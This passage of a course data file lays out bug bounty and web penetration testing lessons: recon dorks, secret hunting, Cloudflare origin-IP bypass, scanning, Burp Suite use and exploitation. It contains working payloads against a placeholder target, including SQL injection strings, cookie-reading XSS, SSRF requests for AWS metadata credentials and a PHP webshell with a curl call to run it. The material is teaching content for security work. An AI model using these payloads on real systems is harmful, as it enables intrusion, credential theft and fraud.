          "Advanced Google search operator techniques to find exposed admin panels, confidential documents, `.env` files, and database dumps.",
        keyTopics: [
          "Core Google Operators: `site:`, `inurl:`, `intitle:`, `filetype:`, `ext:`, `-site:`",
          "Dorks for sensitive files: `site:target.com ext:env OR ext:yml OR ext:json intext:password`",
          "Dorks for exposed admin panels: `site:target.com inurl:admin OR inurl:login OR inurl:dashboard`",
          "Dorks for open cloud storage: `site:s3.amazonaws.com \"target\"`",
        ],
        terminalCommands: [
          "google-dork: site:target.com ext:log | ext:txt | ext:conf",
          "google-dork: site:target.com inurl:api/v1 | inurl:api/v2",
          "google-dork: site:target.com intitle:\"index of\" .git",
        ],
        proTips: [
          "Combine Google Dorking with Bing, Yahoo, and DuckDuckGo; each search engine indexes different internal dev URLs.",
        ],
      },
      {
        id: "l-3-4",
        lessonNumber: "3.4",
        title: "GitHub Reconnaissance & Secret Leak Extraction",
        duration: "3 Hours",
        badge: "Secret Hunting",
        summary:
          "Searching public GitHub repositories and developer commits for hardcoded AWS keys, database credentials, and internal API tokens.",
        keyTopics: [
          "GitHub Search syntax: `org:target \"AKIA\"`, `org:target \"AIza\"`, `\"target.com\" password`",
          "Automated secret scanning with TruffleHog and GitLeaks",
          "Mining developer personal accounts who work at the target company (often committing corporate keys to personal repos)",
        ],
        terminalCommands: [
          "trufflehog github --org=target-org",
          "gitleaks detect --source=./repo/ -v",
          "git log -p | grep -iE 'api_key|secret|password'",
        ],
        proTips: [
          "If a developer removed an API key in the latest commit, inspect `git log` or commit history; the secret is still in git history!",
        ],
      },
      {
        id: "l-3-5",
        lessonNumber: "3.5",
        title: "Shodan, Censys & FOFA Threat Intelligence",
        duration: "3 Hours",
        badge: "IoT & Cloud",
        summary:
          "Querying internet-wide port scans to locate origin web servers, unauthenticated Redis/Elasticsearch databases, and exposed cameras.",
        keyTopics: [
          "Shodan Search Filters: `ssl:\"target.com\"`, `org:\"Target Inc\"`, `http.title:\"Dashboard\"`",
          "Bypassing Cloudflare WAF: Finding the real Origin IP by matching SSL certificate serial numbers on Censys/Shodan",
          "Querying open databases: `port:9200 \"cluster_name\"` (Elasticsearch), `port:6379 \"redis_version\"`",
        ],
        terminalCommands: [
          "shodan search --fields ip_str,port 'ssl:target.com 200'",
          "censys search 'services.tls.certificates.leaf_data.subject.common_name: target.com'",
          "curl -s -H 'Host: target.com' http://<ORIGIN_IP> -k",
        ],
        proTips: [
          "Once you discover the origin IP behind Cloudflare, send your requests directly to that IP with `Host: target.com` to bypass all WAF protections!",
        ],
      },
      {
        id: "l-3-6",
        lessonNumber: "3.6",
        title: "Wayback Machine & Historic Parameter Extraction",
        duration: "2 Hours",
        badge: "Historic Data",
        summary:
          "Mining billions of archived URLs from the Wayback Machine, Common Crawl, and AlienVault OTX for deprecated parameters and endpoints.",
        keyTopics: [
          "Archived URL collectors: `gau` (GetAllUrls) & `waybackurls`",
          "Extracting vulnerable parameters: `ParamSpider` and filtering with `gf` patterns (sqli, xss, ssrf, idor)",
          "Testing historic endpoints that developers forgot to decommission (often running obsolete, unpatched software)",
        ],
        terminalCommands: [
          "echo 'target.com' | gau --subs --blacklist png,jpg,css,js | anew historic_urls.txt",
          "cat historic_urls.txt | gf sqli | anew potential_sqli.txt",
          "python3 paramspider.py -d target.com",
        ],
        proTips: [
          "Legacy APIs (e.g. `/api/v1/user` when `/api/v3` is current) frequently lack modern rate limiting and authorization checks.",
        ],
      },
    ],
    handsOnLab: {
      title: "Lab 3: Uncover Cloudflare Origin IP & Leaked GitHub Secret",
      target: "Simulated Enterprise Asset & Public OSINT Feeds",
      goal: "Use Shodan SSL matching to identify an origin IP bypassing Cloudflare, and extract a valid hardcoded API token from a GitHub commit.",
      steps: [
        "1. Query Shodan using `ssl:target.com` and collect candidates with port 80/443 open.",
        "2. Send an HTTP GET with `-H 'Host: target.com'` to confirm the response matches the production web app.",
        "3. Run TruffleHog against the target organization's public GitHub repositories.",
        "4. Validate the leaked credential against the target API endpoint.",
      ],
      verification: "Successfully communicate with the backend origin server without going through the Cloudflare WAF proxy.",
    },
    checklist: [
      { id: "ch3-t1", label: "Mapped enterprise IP ranges using BGP ASN lookups" },
      { id: "ch3-t2", label: "Queried Certificate Transparency logs via crt.sh and subfinder" },
      { id: "ch3-t3", label: "Built advanced Google Dorks for sensitive files and exposed panels" },
      { id: "ch3-t4", label: "Executed automated GitHub secret hunting with TruffleHog" },
      { id: "ch3-t5", label: "Found unauthenticated Elasticsearch/Redis instances on Shodan" },
      { id: "ch3-t6", label: "Identified Cloudflare Origin IP via Shodan/Censys SSL certificates" },
      { id: "ch3-t7", label: "Extracted historical parameters using gau, waybackurls, and gf patterns" },
      { id: "ch3-t8", label: "Discovered deprecated v1 API routes from archive endpoints" },
    ],
  },
  {
    id: "ch-4-active-recon",
    chapterNumber: 4,
    title: "Active Reconnaissance, Port Scanning & Fuzzing",
    subtitle: "Advanced Nmap, Masscan, Httpx, Nuclei & Content Discovery Fuzzing with ffuf",
    badge: "Chapter 4 • Active Attack Surface",
    duration: "18 Hours • 6 Lessons",
    difficulty: "Intermediate",
    description:
      "Transition from passive intelligence to active probing. Master port scanning mechanics, probe HTTP response behaviors, automate vulnerability triage with Nuclei, and fuzz web applications with SecLists wordlists.",
    iconName: "Target",
    lessons: [
      {
        id: "l-4-1",
        lessonNumber: "4.1",
        title: "Nmap Advanced Scanning, Evasion & Timing",
        duration: "3 Hours",
        badge: "Port Scanning",
        summary:
          "Fine-tuning Nmap performance, timing templates (T1 to T5), packet fragmentation, source port manipulation, and service versioning.",
        keyTopics: [
          "Port Scanning Flag Combos: `-sS -sV -sC -Pn -T4 --open`",
          "Scanning all 65,535 ports: `-p- --min-rate 1000`",
          "Firewall evasion: Fragmenting packets (`-f`), MTU manipulation (`--mtu 24`), spoofing source port (`--source-port 53` for DNS)",
        ],
        terminalCommands: [
          "sudo nmap -sS -p- --min-rate 2000 -T4 target.com -oN full_ports.txt",
          "sudo nmap -sV -sC -p 80,443,8080,8443 target.com -oA detailed_scan",
          "sudo nmap -sS -f --mtu 32 -D RND:5 target.com",
        ],
        proTips: [
          "Always use `--min-rate 1500` when scanning 65k ports to finish in under 3 minutes instead of 2 hours.",
        ],
      },
      {
        id: "l-4-2",
        lessonNumber: "4.2",
        title: "Nmap Scripting Engine (NSE) for Rapid Exploitation",
        duration: "3 Hours",
        badge: "NSE Scripts",
        summary:
          "Harnessing Lua-based Nmap scripts to discover default credentials, SMB vulnerabilities (EternalBlue), SSL weaknesses, and RCE.",
        keyTopics: [
          "Script categories: `default`, `vuln`, `auth`, `safe`, `discovery`",
          "SSL/TLS audit scripts: `ssl-enum-ciphers`, `ssl-heartbleed`",
          "Web vulnerability discovery scripts: `http-enum`, `http-headers`, `http-methods`, `http-shellshock`",
        ],
        terminalCommands: [
          "nmap -p 443 --script ssl-enum-ciphers target.com",
          "nmap -p 80,443 --script http-vuln-* target.com",
          "nmap -p 445 --script smb-vuln-ms17-010 target.com",
        ],
        proTips: [
          "Use `--script-args` to pass custom credentials and wordlists to NSE scripts during authenticated auditing.",
        ],
      },
      {
        id: "l-4-3",
        lessonNumber: "4.3",
        title: "Mass Port Scanning with Masscan & Naabu",
        duration: "2.5 Hours",
        badge: "Massive Scans",
        summary:
          "Scanning entire /16 CIDR ranges (65,536 hosts) in under 2 minutes using asynchronous raw SYN generators.",
        keyTopics: [
          "Masscan architecture: Custom asynchronous TCP stack transmitting up to 10 million packets per second",
          "Naabu: ProjectDiscovery port scanner that integrates natively with Nmap and pipelines into httpx",
          "Avoiding router crashing and ISP bandwidth throttling during high-rate scans",
        ],
        terminalCommands: [
          "sudo masscan -p80,443,8080 192.168.1.0/24 --rate=1000 -oG masscan_out.txt",
          "naabu -host target.com -p - -rate 1500 | httpx -title -status-code",
        ],
        proTips: [
          "Pipe `naabu` output directly into `httpx` to instantly identify web servers running on non-standard ports (e.g. 8443, 8888, 9090).",
        ],
      },
      {
        id: "l-4-4",
        lessonNumber: "4.4",
        title: "HTTP Service Probing with Httpx",
        duration: "2.5 Hours",
        badge: "HTTP Probing",
        summary:
          "Probing thousands of subdomains for live web services, status codes, page titles, tech stacks, and response hashes.",
        keyTopics: [
          "Httpx core flags: `-title`, `-status-code`, `-tech-detect`, `-ip`, `-cdn`, `-content-length`",
          "Filtering out CDN false positives (detecting Akamai, Cloudflare, Fastly)",
          "Extracting response hashes (`-hash sha256`) to group duplicate default error pages",
        ],
        terminalCommands: [
          "cat subs.txt | httpx -silent -status-code -title -tech-detect -follow-redirects",
          "cat subs.txt | httpx -mc 200,302,401,403 -o live_web.txt",
          "cat subs.txt | httpx -path '/admin' -mc 200",
        ],
        proTips: [
          "Use `-mc 401,403` to find protected staging panels — these are prime candidates for 403 bypass techniques!",
        ],
      },
      {
        id: "l-4-5",
        lessonNumber: "4.5",
        title: "Automated Vulnerability Scanning with Nuclei",
        duration: "3.5 Hours",
        badge: "Nuclei Power",
        summary:
          "Running fast template-based vulnerability scans across thousands of hosts for known CVEs, misconfigurations, and default credentials.",
        keyTopics: [
          "Nuclei architecture: Community YAML templates categorized by severity and vulnerability type",
          "Filtering scans by tags: `-tags cve,rce,ssrf,takeover`",
          "Writing custom Nuclei YAML templates with matchers (word, regex, status) and extractors",
        ],
        terminalCommands: [
          "nuclei -update-templates",
          "nuclei -l live_web.txt -tags cve,misconfig -severity critical,high",
          "nuclei -u https://target.com -t exposures/tokens/ -v",
        ],
        proTips: [
          "Write your own private Nuclei templates whenever a new CVE drops on Twitter; you can scan your entire target list before anyone else!",
        ],
      },
      {
        id: "l-4-6",
        lessonNumber: "4.6",
        title: "Directory & Content Discovery Fuzzing with ffuf",
        duration: "3.5 Hours",
        badge: "Fuzzing",
        summary:
          "High-speed content discovery, parameter fuzzing, recursion, and filtering out noise using SecLists wordlists.",
        keyTopics: [
          "ffuf syntax: `-u https://target.com/FUZZ -w /path/to/wordlist`",
          "Filtering options: `-fc 404`, `-fs <size>` (filter exact size), `-fw <words>`, `-fl <lines>`",
          "Parameter fuzzing: `ffuf -u https://target.com/page?FUZZ=test -w parameters.txt`",
          "Recursion flags: `-recursion -recursion-depth 2`",
        ],
        terminalCommands: [
          "ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302 -fc 404",
          "ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -fs 1240",
          "ffuf -u https://target.com/api/v1/users?FUZZ=1 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 240",
        ],
        proTips: [
          "When you get 5,000 false positives with status 200, check the content length of the false response and use `-fs <length>` to filter them out instantly.",
        ],
      },
    ],
    handsOnLab: {
      title: "Lab 4: Automated Active Recon Pipeline Execution",
      target: "Self-Hosted Vulnerable Application (OWASP Juice Shop / DVWA)",
      goal: "Execute a full active recon chain: Port scan with Naabu, probe HTTP with Httpx, fuzz directories with ffuf, and execute a Nuclei scan.",
      steps: [
        "1. Scan all 65,535 ports on the target using `naabu -p -`.",
        "2. Feed discovered ports into `httpx -status-code -title -tech-detect`.",
        "3. Run `ffuf` against discovered web ports using `raft-medium-directories.txt` with size filtering.",
        "4. Run a focused `nuclei` scan targeting misconfigurations and exposed panels.",
      ],
      verification: "Locate hidden administration portals and exposed database credentials through fuzzing logs.",
    },
    checklist: [
      { id: "ch4-t1", label: "Mastered Nmap timing templates and full 65k port scans" },
      { id: "ch4-t2", label: "Audited SSL ciphers and web services using Nmap NSE scripts" },
      { id: "ch4-t3", label: "Conducted high-speed port scanning using Masscan and Naabu" },
      { id: "ch4-t4", label: "Probed live web servers and tech stacks using Httpx" },
      { id: "ch4-t5", label: "Executed template-based vulnerability scans using Nuclei" },
      { id: "ch4-t6", label: "Written a custom Nuclei YAML template with matchers" },
      { id: "ch4-t7", label: "Fuzzed web directories using ffuf and filtered response sizes with -fs" },
      { id: "ch4-t8", label: "Fuzzed GET/POST query parameters using SecLists parameter wordlists" },
    ],
  },
  {
    id: "ch-5-burp",
    chapterNumber: 5,
    title: "Burp Suite Pro Masterclass & Traffic Interception",
    subtitle: "Proxy Setup, Repeater, Intruder Attacks, Turbo Intruder & Race Conditions",
    badge: "Chapter 5 • The Primary Weapon",
    duration: "20 Hours • 6 Lessons",
    difficulty: "Intermediate",
    description:
      "Burp Suite is the industry-standard toolkit for web penetration testing and bug bounty hunting. Master request interception, Scope definitions, automated payload injections, single-packet race conditions, and essential extensions.",
    iconName: "Wrench",
    lessons: [
      {
        id: "l-5-1",
        lessonNumber: "5.1",
        title: "Proxy Setup, SSL Certificates & Target Scope Architecture",
        duration: "3 Hours",
        badge: "Setup",
        summary:
          "Configuring browser interception, importing the PortSwigger CA certificate, and defining precise regex Target Scope to prevent legal out-of-scope testing.",
        keyTopics: [
          "Installing PortSwigger CA certificate into Firefox and system trust store",
          "Target Scope configuration: Including `.*\\.target\\.com` and excluding CDN/logout endpoints",
          "Using Burp's embedded Chromium browser for immediate pre-configured testing",
        ],
        terminalCommands: [
          "curl http://127.0.0.1:8080/cert -o cacert.der",
          "openssl x509 -inform DER -in cacert.der -out cacert.pem",
        ],
        proTips: [
          "Always check 'Drop out-of-scope traffic' in Proxy Options so your Burp sitemap doesn't fill with third-party tracking scripts.",
        ],
      },
      {
        id: "l-5-2",
        lessonNumber: "5.2",
        title: "Burp Repeater & Request Mutation Mastery",
        duration: "3 Hours",
        badge: "Repeater",
        summary:
          "Manipulating HTTP headers, switching HTTP methods (GET/POST/PUT/PATCH), modifying MIME types, and observing raw response differentials.",
        keyTopics: [
          "Repeater shortcuts: `Ctrl+R` to send to Repeater, `Ctrl+Space` to fire request",
          "Method tampering: Changing `GET /api/user` to `POST /api/user` or `PUT /api/user` to bypass authorization checks",
          "Header manipulation: `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`",
        ],
        terminalCommands: [
          "curl -X PUT -H 'Content-Type: application/json' -d '{\"role\":\"admin\"}' https://target.com/api/user/10",
        ],
        proTips: [
          "Use Repeater Tab Groups to organize related endpoints (e.g. Authentication, Cart, Profile, Checkout).",
        ],
      },
      {
        id: "l-5-3",
        lessonNumber: "5.3",
        title: "Burp Intruder: All 4 Attack Modes Dissected",
        duration: "3.5 Hours",
        badge: "Intruder",
        summary:
          "Mastering Sniper, Battering Ram, Pitchfork, and Cluster Bomb attack modes for fuzzing, credential stuffing, and ID enumeration.",
        keyTopics: [
          "Sniper: Tests 1 payload position at a time (ideal for fuzzing parameter vulnerabilities)",
          "Battering Ram: Tests identical payload across all positions simultaneously",
          "Pitchfork: Iterates through multiple payload sets in parallel (Set 1 Username paired with Set 2 Password)",
          "Cluster Bomb: Tests every permutation of multiple payload sets (exhaustive brute-force)",
        ],
        terminalCommands: [
          "ffuf -u https://target.com/login -X POST -d 'user=FUZZ&pass=test' -w users.txt",
        ],
        proTips: [
          "In Community edition, Intruder is throttled; use `ffuf` or `Turbo Intruder` for high-speed brute forcing without limitations.",
        ],
      },
      {
        id: "l-5-4",
        lessonNumber: "5.4",
        title: "Turbo Intruder & Single-Packet Race Conditions",
        duration: "4 Hours",
        badge: "High Severity",
        summary:
          "Writing custom Python single-packet attack scripts to exploit concurrency flaws, duplicate coupon redemption, and double withdrawals.",
        keyTopics: [
          "Race Condition Theory: Exploiting the time-of-check to time-of-use (TOCTOU) gap between database read and write operations",
          "Single-Packet Attack: Packaging 50 requests inside a single TCP packet over HTTP/2 to arrive at the server in the exact same microsecond",
          "Writing Turbo Intruder Python handlers: `queueRequests` and `handleResponse`",
        ],
        terminalCommands: [
          "turbo-intruder: engine.queue(target.req, gate='race1')",
          "turbo-intruder: engine.openGate('race1')",
        ],
        proTips: [
          "Test Turbo Intruder on gift card redemption, discount coupons, upvoting systems, and fund transfers for instant critical payouts.",
        ],
      },
      {
        id: "l-5-5",
        lessonNumber: "5.5",
        title: "Match & Replace Rules for Automated Testing",
        duration: "3 Hours",
        badge: "Automation",
        summary:
          "Configuring proxy Match and Replace rules to auto-spoof IP headers, strip security headers, and test unauthorized access.",
        keyTopics: [
          "Auto-injecting headers: `X-Forwarded-For: 127.0.0.1` on all outgoing requests",
          "Stripping client-side validation: Auto-removing `disabled` and `readonly` attributes from HTML forms",
          "Replacing User-Agent with Googlebot (`Googlebot/2.1`) to inspect search engine bypasses",
        ],
        terminalCommands: [
          "burp-rule: Match: ^(Host:.*) -> Replace: $1\\r\\nX-Forwarded-For: 127.0.0.1",
        ],
        proTips: [
          "Create a Match and Replace rule that replaces User A's session cookie with User B's cookie to test every clicked button for IDOR in real time!",
        ],
      },
      {
        id: "l-5-6",
        lessonNumber: "5.6",
        title: "Essential BApp Store Extensions Matrix",
        duration: "3.5 Hours",
        badge: "Extensions",
        summary:
          "Supercharging Burp Suite with Autorize, Logger++, JSON Web Tokens, Param Miner, and Flow.",
        keyTopics: [
          "Autorize: Automated horizontal and vertical authorization testing while you browse normally",
          "Param Miner: Automatic discovery of unlinked and hidden HTTP request parameters",
          "JSON Web Token (JWT) Editor: Forging JWTs, testing 'none' algorithm and key confusion attacks",
        ],
        terminalCommands: [
          "burp-extension: Install Autorize from BApp Store",
          "burp-extension: Configure Low-Privilege Cookie in Autorize",
        ],
        proTips: [
          "Leave Autorize running in the background while performing manual site browsing; it automatically flags every IDOR you stumble across!",
        ],
      },
    ],
    handsOnLab: {
      title: "Lab 5: Exploit a Coupon Race Condition with Turbo Intruder",
      target: "PortSwigger Lab: Exploiting Time-of-Check to Time-of-Use Race Conditions",
      goal: "Use Turbo Intruder with a single-packet gate to apply a 20% discount coupon 10 times on a single cart item to purchase a $1,000 item for $0.",
      steps: [
        "1. Intercept the `POST /cart/coupon` request in Burp Suite.",
        "2. Send the request to Extensions → Turbo Intruder.",
        "3. Select the `race-single-packet-attack.py` template.",
        "4. Queue 30 requests and release the single-packet gate simultaneously.",
        "5. Observe the final shopping cart total drop below zero and checkout successfully.",
      ],
      verification: "Confirm the product is purchased with an inflated discount exceeding the permitted single application.",
    },
    checklist: [
      { id: "ch5-t1", label: "Configured Burp Suite Proxy and imported PortSwigger CA Certificate" },
      { id: "ch5-t2", label: "Defined strict regex Target Scope to prevent out-of-scope traffic" },
      { id: "ch5-t3", label: "Mastered Burp Repeater request tampering and method switching" },
      { id: "ch5-t4", label: "Understood all 4 Burp Intruder attack modes (Sniper, Battering Ram, Pitchfork, Cluster Bomb)" },
      { id: "ch5-t5", label: "Written and executed single-packet race condition attacks in Turbo Intruder" },
      { id: "ch5-t6", label: "Configured automated Match & Replace rules for header spoofing" },
      { id: "ch5-t7", label: "Installed and automated authorization audits with Autorize BApp extension" },
      { id: "ch5-t8", label: "Discovered hidden parameters using Param Miner extension" },
    ],
  },
  {
    id: "ch-6-bugs",
    chapterNumber: 6,
    title: "100+ Web Vulnerabilities & Bug Bounty Exploitation",
    subtitle: "IDOR, SQLi, XSS, SSRF, Broken Access Control, CSRF, File Upload RCE & Business Logic",
    badge: "Chapter 6 • The Offensive Arsenal",
    duration: "30 Hours • 10 Lessons",
    difficulty: "Advanced",
    description:
      "The complete offensive encyclopedia. Master testing methodologies, impact demonstrations, bypass techniques, and remediation guidance for over 100 web application vulnerabilities tested on live bug bounty programs.",
    iconName: "Bug",
    lessons: [
      {
        id: "l-6-1",
        lessonNumber: "6.1",
        title: "IDOR & Broken Object Level Authorization (BOLA)",
        duration: "3 Hours",
        badge: "High Bounty",
        summary:
          "Manipulating numeric IDs, UUIDs, and hidden parameters in REST and GraphQL APIs to view and modify sensitive user records.",
        keyTopics: [
          "Numeric ID parameter tampering: `GET /api/documents/1029` → `1030`",
          "UUID bypass techniques: Finding leaked UUIDs in public profile endpoints, comments, or historic URLs",
          "Method switching & JSON parameter pollution: Changing GET to POST/PUT/DELETE to manipulate foreign data",
          "Testing IDOR in PDF/Invoice generation endpoints and password reset flows",
        ],
        terminalCommands: [
          "curl -H 'Authorization: Bearer USER_A_TOKEN' https://target.com/api/v1/orders/USER_B_ID",
        ],
        proTips: [
          "Whenever you see an encoded identifier, check if it's Base64! `eyJpZCI6MTIzfQ==` decodes to `{\"id\":123}`.",
        ],
      },
      {
        id: "l-6-2",
        lessonNumber: "6.2",
        title: "SQL Injection (SQLi): Error, Union, Blind & Out-of-Band",
        duration: "3.5 Hours",
        badge: "Critical Impact",
        summary:
          "Extracting entire backend database schemas, bypassing login screens, and executing code via SQL injection.",
        keyTopics: [
          "Authentication Bypass: `' OR 1=1-- -` and `' OR '1'='1`",
          "Union-Based SQLi: Determining column counts (`ORDER BY 1,2,3...`) and data types (`UNION SELECT 'a',NULL`)",
          "Error-Based SQLi: Forcing database verbose errors via `EXTRACTVALUE`, `UPDATEXML`, or `CAST`",
          "Time-Based Blind SQLi: `'; IF (1=1) WAITFOR DELAY '0:0:5'--` and `pg_sleep(5)`",
          "SQLMap automation mastery: Tamper scripts, risk/level parameters, database dumping",
        ],
        terminalCommands: [
          "sqlmap -u 'https://target.com/item?id=1' --batch --dbs",
          "sqlmap -r request.txt -p id --tamper=space2comment --risk=3 --level=5 --dump",
        ],
        proTips: [
          "Never run `--dump-all` during bug bounties; dump only `current-user` and `current-db` to demonstrate critical impact responsibly.",
        ],
      },
      {
        id: "l-6-3",
        lessonNumber: "6.3",
        title: "Cross-Site Scripting (XSS): Reflected, Stored & DOM",
        duration: "3.5 Hours",
        badge: "Client-Side",
        summary:
          "Executing arbitrary JavaScript in victim browsers, stealing session cookies, crafting CSRF exploits, and bypassing Content Security Policies (CSP).",
        keyTopics: [
          "Contextual XSS: HTML Context, Attribute Context (`\" onfocus=alert(1) autofocus=\"`), JavaScript Context",
          "Stored XSS in user profiles, comments, SVG avatars, and invoice company names",
          "DOM-based XSS: Sinks (`innerHTML`, `document.write`, `location.href`) and Sources (`location.search`, `hash`)",
          "Content Security Policy (CSP) Bypasses: JSONP endpoints, CDN whitelists, base-uri injection",
        ],
        terminalCommands: [
          "payload: <img src=x onerror=alert(document.domain)>",
          "payload: \"><svg/onload=confirm(document.cookie)>",
          "payload: javascript:alert(document.domain)",
        ],
        proTips: [
          "Always prove impact in bug bounty reports: Instead of `alert(1)`, demonstrate reading sensitive CSRF tokens or user emails.",
        ],
      },
      {
        id: "l-6-4",
        lessonNumber: "6.4",
        title: "Server-Side Request Forgery (SSRF): Cloud Metadata & Internal Pivoting",
        duration: "3.5 Hours",
        badge: "Critical Impact",
        summary:
          "Forcing backend web servers to make requests to internal network services, Redis instances, and cloud metadata APIs.",
        keyTopics: [
          "AWS Metadata Extraction: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`",
          "GCP & Azure Metadata Header Requirements & Bypasses",
          "Bypassing Blacklist Filters: Decimal IP (`2852039166`), Hex (`0x7f000001`), Octal (`0177.0.0.1`), Enclosed Alphanumerics, DNS Rebinding",
          "Blind SSRF Detection using ProjectDiscovery Interactsh & Burp Collaborator",
        ],
        terminalCommands: [
          "curl -s 'http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/'",
          "interactsh-client",
        ],
        proTips: [
          "DNS Rebinding is the ultimate bypass for SSRF: Configure a domain that resolves to a public IP on the 1st request and 127.0.0.1 on the 2nd request.",
        ],
      },
      {
        id: "l-6-5",
        lessonNumber: "6.5",
        title: "Broken Access Control & Privilege Escalation",
        duration: "3 Hours",
        badge: "OWASP #1",
        summary:
          "Vertical privilege escalation (standard user becoming admin) and horizontal privilege escalation (accessing other users' resources).",
        keyTopics: [
          "Mass Assignment Vulnerability: Submitting `\"is_admin\": true` or `\"role\": \"superuser\"` in profile update requests",
          "Path Traversal & Admin Access: `GET /admin/users` blocked, but `GET /users/..;/admin/users` allowed by reverse proxies",
          "Feature toggle parameter tampering: `\"beta_features\": true`, `\"can_export\": true`",
        ],
        terminalCommands: [
          "curl -X PUT -H 'Content-Type: application/json' -d '{\"role\":\"admin\",\"is_verified\":true}' https://target.com/api/profile",
        ],
        proTips: [
          "Inspect all JavaScript files for hidden admin routes: search for strings like `'/admin'`, `'superadmin'`, `'manage_users'`.",
        ],
      },
      {
        id: "l-6-6",
        lessonNumber: "6.6",
        title: "CSRF & CORS Misconfigurations",
        duration: "3 Hours",
        badge: "Session Flaws",
        summary:
          "Forcing authenticated victims to perform unwanted actions, and exploiting permissive CORS headers (`Access-Control-Allow-Origin: *` with credentials) to steal private data.",
        keyTopics: [
          "Cross-Site Request Forgery (CSRF): Generating automated HTML exploit PoCs with auto-submitting forms",
          "Bypassing CSRF Defenses: SameSite cookie nuances (None vs Lax vs Strict), removing CSRF tokens entirely, content-type spoofing",
          "CORS Misconfiguration: Null origin reflection, dynamic origin reflection, wildcard regex errors (`target.com.attacker.com`)",
        ],
        terminalCommands: [
          "cors-poc: var req = new XMLHttpRequest(); req.open('GET', 'https://target.com/api/user', true); req.withCredentials = true; req.send();",
        ],
        proTips: [
          "If `Access-Control-Allow-Credentials: true` is present with an origin you control, you can read sensitive private user accounts across domains.",
        ],
      },
      {
        id: "l-6-7",
        lessonNumber: "6.7",
        title: "Malicious File Upload Attacks to Remote Code Execution (RCE)",
        duration: "3.5 Hours",
        badge: "RCE Critical",
        summary:
          "Bypassing client-side and server-side file upload filters to upload webshells, execute arbitrary commands, and compromise servers.",
        keyTopics: [
          "Extension Blacklist Bypasses: `.phtml`, `.php5`, `.php7`, `.phar`, `.jspx`, `.asp;.jpg`",
          "MIME-Type & Magic Byte Spoofing: Prepending GIF89a or PNG magic headers to PHP webshells",
          "SVG XML Entity Injection (XXE) & XSS through uploaded profile pictures",
          "Double Extension & Path Traversal filenames: `shell.php.png` or `../../shell.php`",
        ],
        terminalCommands: [
          "echo 'GIF89a;<?php system($_GET[\"cmd\"]); ?>' > shell.php.gif",
          "curl https://target.com/uploads/shell.php?cmd=id",
        ],
        proTips: [
          "If uploads are hosted on AWS S3 buckets rather than the web server, look for HTML/SVG upload allowing stored XSS instead of RCE.",
        ],
      },
      {
        id: "l-6-8",
        lessonNumber: "6.8",
        title: "JSON Web Token (JWT) Attacks & Key Confusion",
        duration: "2.5 Hours",
        badge: "Crypto & Auth",
        summary:
          "Cracking weak HMAC secrets, none-algorithm signature stripping, and exploiting public key confusion (RS256 to HS256).",
        keyTopics: [
          "JWT Anatomy: Header, Payload, Signature separated by dots",
          "Algorithm 'None' Attack: Stripping signature and setting `\"alg\": \"none\"`",
          "HMAC Secret Key Cracking using John The Ripper / Hashcat and rockyou.txt",
          "Algorithm Confusion Attack: Signing a token with the public RSA certificate using HMAC-SHA256",
        ],
        terminalCommands: [
          "hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt",
          "jwt_tool.py <TOKEN> -X a",
        ],
        proTips: [
          "Use the `jwt_tool` CLI to automatically run 20+ known JWT attack variations against any token in 5 seconds.",
        ],
      },
      {
        id: "l-6-9",
        lessonNumber: "6.9",
        title: "Business Logic Flaws & E-Commerce Vulnerabilities",
        duration: "2.5 Hours",
        badge: "Business Logic",
        summary:
          "Tampering with prices, rounding errors, negative quantities, step skipping in workflows, and parameter manipulation.",
        keyTopics: [
          "Price Tampering: Changing `\"price\": 1000` to `\"price\": 0.01` in client checkout requests",
          "Integer Overflow & Negative Quantities: Purchasing 1 item with quantity -1 to credit account balance",
          "Workflow Step Skipping: Jumping from Step 1 (Select Product) directly to Step 4 (Order Confirmation)",
        ],
        terminalCommands: [
          "curl -X POST -d '{\"item_id\":10,\"quantity\":-5}' https://target.com/cart/add",
        ],
        proTips: [
          "Automated scanners cannot find business logic flaws; this is where manual human testing earns the highest bug bounty rewards.",
        ],
      },
      {
        id: "l-6-10",
        lessonNumber: "6.10",
        title: "Subdomain Takeover & Dangling DNS Records",
        duration: "2.5 Hours",
        badge: "Takeover",
        summary:
          "Detecting CNAME records pointing to abandoned third-party services (S3, GitHub Pages, Heroku, Shopify) and claiming ownership.",
        keyTopics: [
          "Dangling CNAME identification and matching with fingerprint fingerprints.json",
          "Claiming AWS S3 buckets: 'NoSuchBucket' error messages",
          "Claiming GitHub Pages: 'There isn't a GitHub Pages site here.'",
        ],
        terminalCommands: [
          "subjack -w subs.txt -t 100 -timeout 30 -ssl -v",
          "subzy run --targets subs.txt",
        ],
        proTips: [
          "Always take a non-destructive screenshot when verifying a subdomain takeover (e.g. create a text file proving ownership).",
        ],
      },
    ],
    handsOnLab: {
      title: "Lab 6: Full Chain Exploitation (IDOR + CSRF + File Upload RCE)",
      target: "Vulnerable Practice Lab (DVWA / PortSwigger Lab)",
      goal: "Chain multiple vulnerabilities together: find an IDOR exposing an admin API token, use CSRF to create an admin account, and upload a webshell for RCE.",
      steps: [
        "1. Intercept profile API queries and tamper with user ID to view admin details.",
        "2. Identify an unauthenticated endpoint accepting file uploads.",
        "3. Bypass extension validation using double extensions and magic bytes.",
        "4. Execute `id` and `whoami` through the uploaded webshell to confirm RCE.",
      ],
      verification: "Execute arbitrary system commands and display server hostname on the terminal.",
    },
    checklist: [
      { id: "ch6-t1", label: "Found and exploited IDOR/BOLA in REST and GraphQL APIs" },
      { id: "ch6-t2", label: "Executed Union-based and Time-based Blind SQL Injection" },
      { id: "ch6-t3", label: "Differentiated Reflected, Stored, and DOM-based Cross-Site Scripting" },
      { id: "ch6-t4", label: "Extracted cloud metadata credentials via Server-Side Request Forgery (SSRF)" },
      { id: "ch6-t5", label: "Bypassed Broken Access Control using mass assignment and path traversal" },
      { id: "ch6-t6", label: "Created working HTML Proof-of-Concept for CSRF and CORS data theft" },
      { id: "ch6-t7", label: "Bypassed file upload blacklists to achieve Remote Code Execution" },
      { id: "ch6-t8", label: "Cracked weak JWT HMAC secrets and exploited None-algorithm tokens" },
      { id: "ch6-t9", label: "Identified and exploited business logic price/quantity tampering" },
      { id: "ch6-t10", label: "Discovered and claimed dangling CNAME subdomain takeovers" },
